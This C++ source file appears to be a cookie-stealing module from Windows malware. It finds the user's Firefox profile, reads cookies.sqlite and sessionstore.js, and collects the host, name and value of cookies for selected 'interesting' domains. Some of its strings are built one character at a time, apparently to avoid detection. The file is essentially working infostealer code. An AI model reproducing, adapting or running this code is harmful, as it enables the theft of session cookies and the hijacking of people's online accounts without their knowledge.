#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "cookies.h"
#include "chrome_cookies.h"
#include "sqlite.h"
#include "debug.h"
#include "JSON.h"

LPSTR GetFirefoxProfilePathA()
{
	LPSTR strAppData = (LPSTR) zalloc(MAX_FILE_PATH+1);
	SHGetSpecialFolderPathA(NULL, strAppData, CSIDL_APPDATA, TRUE);

	LPSTR strIniPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	_snprintf_s(strIniPath, MAX_FILE_PATH, _TRUNCATE, "%s\\Mozilla\\Firefox\\profiles.ini", strAppData); // FIXME: array

	LPSTR strRelativePath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	GetPrivateProfileStringA("Profile0", "Path", "", strRelativePath, MAX_FILE_PATH, strIniPath);  //FIXME: array
	 
	LPSTR strFullPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	_snprintf_s(strFullPath, MAX_PATH, _TRUNCATE, "%s\\Mozilla\\Firefox\\%s", strAppData, strRelativePath);  //FIXME: array

	LPSTR strShortPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	GetShortPathNameA(strFullPath, strShortPath, MAX_PATH);

	zfree(strAppData);
	zfree(strIniPath);
	zfree(strRelativePath);
	zfree(strFullPath);

	if (!PathFileExistsA(strShortPath))
	{
		zfree(strShortPath);
		return NULL;
	}
	return strShortPath;
}

LPWSTR GetFirefoxProfilePath()
{
	LPSTR strProfileA = GetFirefoxProfilePathA();
	if (!strProfileA)
		return NULL;

	LPWSTR strProfile = (LPWSTR) zalloc((strlen(strProfileA)+1)*sizeof(WCHAR));
	_snwprintf_s(strProfile, strlen(strProfileA)+1, _TRUNCATE, L"%S", strProfileA);
	zfree(strProfileA);

	return strProfile;
}


int ParseFirefoxCookies(LPVOID lpReserved, int dwColumns, LPSTR *strValues, LPSTR *strNames)
{
	LPSTR strHost, strName, strValue;
	strHost = strName = strValue = 0;

	for (int i=0; i<dwColumns; i++)
	{
		if (!strHost && !_stricmp(strNames[i], "host"))  //FIXME: array
			strHost = _strdup(strValues[i]);
		if (!strName && !_stricmp(strNames[i], "name"))  //FIXME: array
			strName = _strdup(strValues[i]);
		if (!strValue && !_stricmp(strNames[i], "value"))  //FIXME: array
			strValue = _strdup(strValues[i]);
	}

	if (strHost)
	{
		NormalizeDomainA(strHost);
		if (strName && strValue && IsInterestingDomainA(strHost))
			AddCookieA(strHost, strName, strValue);
	}

	zfree(strHost);
	zfree(strName);
	zfree(strValue);

	return 0;
}

BOOL DumpSqliteFirefox(LPSTR strProfilePath)
{
	LPSTR strPath = (LPSTR) zalloc(MAX_FILE_PATH+1);
	sprintf_s(strPath, MAX_PATH, "%s\\%s", strProfilePath, "cookies.sqlite"); // FIXME: array

	sqlite3 *lpDb = NULL;
	if (sqlite3_open((const char *)strPath, &lpDb) == SQLITE_OK)
	{
#ifdef _DEBUG
		LPSTR strErr;
		if (sqlite3_exec(lpDb, "SELECT * FROM moz_cookies;", ParseFirefoxCookies, NULL, &strErr) != SQLITE_OK)  //FIXME: array
		{
			OutputDebug(L"[!!] Querying sqlite3 for firefox cookies: %S\n", strErr);
			__asm int 3;
			zfree(strErr);
		}
#else
		sqlite3_exec(lpDb, "SELECT * FROM moz_cookies;", ParseFirefoxCookies, NULL, NULL);  //FIXME: array
#endif
		sqlite3_close(lpDb);
	}

	zfree(strPath);
	return TRUE;
}

VOID ParseFirefoxSessionCookies(JSONValue *jValue)
{
	WCHAR strHost[] = { L'h', L'o', L's', L't', L'\0' };
	WCHAR strName[] = { L'n', L'a', L'm', L'e', L'\0' };
	WCHAR strValue[] = { L'v', L'a', L'l', L'u', L'e', L'\0' };
	WCHAR strWin[] = { L'w', L'i', L'n', L'd', L'o', L'w', L's', L'\0' };
	WCHAR strCookies[] = { L'c', L'o', L'o', L'k', L'i', L'e', L's', L'\0' };

	if (jValue == NULL || !jValue->IsObject())
		return;

	JSONObject jRoot = jValue->AsObject();
	if (jRoot.find(strWin) != jRoot.end() && jRoot[strWin]->IsArray())
	{
		JSONArray jWindows = jRoot[strWin]->AsArray();
		for (DWORD i=0; i<jWindows.size(); i++)
		{
			if (!jWindows.at(i)->IsObject())
				continue;

			JSONObject jTabs = jWindows.at(i)->AsObject();
			if (jTabs.find(strCookies) != jTabs.end() )
				if (jTabs[strCookies]->IsArray())
			{
				JSONArray jCookies = jTabs[strCookies]->AsArray();
				for (DWORD x=0; x<jCookies.size(); x++)
				{
					if (!jCookies.at(x)->IsObject())
						continue;

					LPWSTR strCookieHost = NULL;
					LPWSTR strCookieName = NULL;
					LPWSTR strCookieValue = NULL;

					JSONObject jCookie = jCookies.at(x)->AsObject();
					if (jCookie.find(strHost) != jCookie.end() && jCookie[strHost]->IsString())
						strCookieHost = _wcsdup(jCookie[strHost]->AsString().c_str());
					if (jCookie.find(strName) != jCookie.end() && jCookie[strName]->IsString())
						strCookieName = _wcsdup(jCookie[strName]->AsString().c_str());
					if (jCookie.find(strValue) != jCookie.end() && jCookie[strValue]->IsString())
						strCookieValue = _wcsdup(jCookie[strValue]->AsString().c_str());

					
					NormalizeDomainW(strHost);
					if (strCookieHost && strCookieName && strCookieValue && IsInterestingDomainW(strCookieHost))
						AddCookieW(strCookieHost, strCookieName, strCookieValue);

					zfree(strCookieHost);
					zfree(strCookieName);
					zfree(strCookieValue);
				}
			}
		}
	}
	
}

VOID DumpFirefoxSessionCookies(LPSTR strProfilePath)
{
	LPWSTR strSessionStorePath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
	_snwprintf_s(strSessionStorePath, MAX_FILE_PATH, _TRUNCATE, L"%S\\sessionstore.js", strProfilePath);

	LPSTR lpFileBuffer = (LPSTR) MapFile(strSessionStorePath, FILE_SHARE_READ|FILE_SHARE_WRITE);
	if (lpFileBuffer)
	{
		JSONValue *jValue = JSON::Parse(lpFileBuffer);
		if (jValue)
		{
			ParseFirefoxSessionCookies(jValue);
			delete jValue;
		}
	}

	zfree(lpFileBuffer);
	zfree(strSessionStorePath);
}

VOID DumpFirefoxCookies()
{
	LPSTR strProfilePath = GetFirefoxProfilePathA();
	if (!strProfilePath)
		return;

	DumpSqliteFirefox(strProfilePath);
	DumpFirefoxSessionCookies(strProfilePath);

	zfree(strProfilePath);
}